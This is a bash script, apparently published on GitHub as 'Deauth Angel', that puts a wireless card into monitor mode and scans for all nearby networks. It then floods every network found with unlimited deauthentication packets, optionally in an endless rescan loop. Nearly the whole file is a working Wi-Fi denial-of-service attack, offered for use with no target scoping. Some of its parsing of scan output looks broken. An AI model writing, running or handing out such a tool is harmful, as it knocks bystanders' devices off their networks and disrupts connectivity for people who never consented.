#!/bin/bash
# ASCII Art
echo "========================================================"
echo "  _____                   _   _                               _  "
echo " |  __ \\                 | | | |       /\\                    | | "
echo " | |  | | ___  __ _ _   _| |_| |__    /  \\   _ __   __ _  ___| | "
echo " | |  | |/ _ \\/ _\` | | | | __| '_ \\  / /\\ \\ | '_ \\ / _\` |/ _ \\ | "
echo " | |__| |  __/ (_| | |_| | |_| | | |/ ____ \\| | | | (_| |  __/ | "
echo " |_____/ \\___|\\__,_|\\__,_|\\__|_| |_/_/    \\_\\_| |_|\\__, |\___|_| "
echo "                                                    __/ |        "
echo "                                                   |___/          "
echo "========================================================"
echo "Created by: Corvus Codex"
echo "Github: https://github.com/CorvusCodex/"
echo "Licence : MIT License"
echo "Support my work:"
echo "BTC: bc1q7wth254atug2p4v9j3krk9kauc0ehys2u8tgg3"
echo "ETH & BNB: 0x68B6D33Ad1A3e0aFaDA60d6ADf8594601BE492F0"
echo "Buy me a coffee: https://www.buymeacoffee.com/CorvusCodex"
echo "========================================================"

# Function to check if a command exists
command_exists () {
    type "$1" &> /dev/null ;
}

# Function to install a package
install_package () {
    if ! command_exists $1; then
        echo "$1 could not be found, would you like to install it now? (yes/no)"
        read answer
        if [ "$answer" != "${answer#[Yy]}" ] ;then
            echo "Installing $1..."
            apt-get install $1 -y
            if [ $? -ne 0 ]; then
                echo "Failed to install $1"
                exit 1
            fi
        fi
    fi
}

# Check if script is run as root
if [ "$EUID" -ne 0 ]
then 
    echo "Please run as root"
    exit
fi

# Check if user specified a wireless interface
if [ -z "$1" ]
then
    echo "Please specify a wireless interface"
    exit
fi

INTERFACE=$1

# Check if user specified a loop parameter
if [ "$2" == "loop" ]
then
    LOOP=true
else
    LOOP=false
fi

# Check if necessary tools are installed
install_package airmon-ng
install_package airodump-ng
install_package aireplay-ng

# Start monitor mode on the specified interface
airmon-ng start $INTERFACE

# Scan for networks and save the output to a file
airodump-ng ${INTERFACE}mon > networks.txt

# Parse the file to get the BSSIDs of the networks
bssids=$(awk '/BSSID/ {getline; print $2}' networks.txt)

# Send deauthentication packets to all devices on each network
while true; do
    for bssid in $bssids
    do
        aireplay-ng --deauth 0 -a $bssid ${INTERFACE}mon
    done

    # If the loop parameter is not set, break the loop after the first iteration
    if ! $LOOP; then
        break
    fi

    # Rescan for networks and update the list of BSSIDs
    airodump-ng ${INTERFACE}mon > networks.txt
    bssids=$(awk '/BSSID/ {getline; print $2}' networks.txt)
done

echo "========================================================"
echo "Script executed successfully"
echo "Buy me a coffee: https://www.buymeacoffee.com/CorvusCodex"
echo "========================================================"
